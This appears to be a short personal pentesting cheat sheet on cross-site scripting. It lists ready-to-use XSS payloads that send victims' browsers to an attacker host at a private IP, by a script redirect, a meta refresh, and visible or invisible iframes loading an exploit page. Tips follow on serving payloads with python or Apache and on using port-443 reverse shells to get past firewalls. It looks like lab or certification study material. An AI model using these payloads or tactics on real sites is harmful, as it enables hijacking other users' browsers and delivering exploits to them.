# XSS / Cross-Site Scripting


An XSS vulnerability enables an attacker to inject client-side scripts into web pages viewed by other users.

## Payloads


Total redirect
<script>document.location='http://10.11.0.184:8080/'</script>

A hard redirect (refer to User Exploitation sub-node)
<meta http-equiv="refresh" content="5; url=http://10.11.0.184:8080/blah"/>

Insert an iframe
<iframe src="http://10.11.0.184:8000/exploit.html"></iframe>

Insert an invisible iframe
<iframe src="http://10.11.0.5/report" height = "0" width ="0"></iframe>

## Troubleshooting XSS Attacks


• Try client-side-exploits locally first to verify that it works -> then progress to the target
• Try serving via python - python3 -m http.server (can see web requests easily)
• Try servicing via Apache - service apache2 start (might work more reliably with Apache for some reason)
• Try using a 443 reverse shell, which should bypass firewalls (if any)
◇ bind shells behind firewalls won't because they won't allow inbound connections
◇ reverse shells because all outbound traffic is pretty much allowed
• Sometimes the payload delivery can be the problem
◇ Try mimicking the payload delivery in your test machine first
◇ Or just try different methods (like below + google)
• Don't copy/paste from exploit-db, download instead
◇ sometimes exploits can have funny line-endings which can mess the whole exploit up
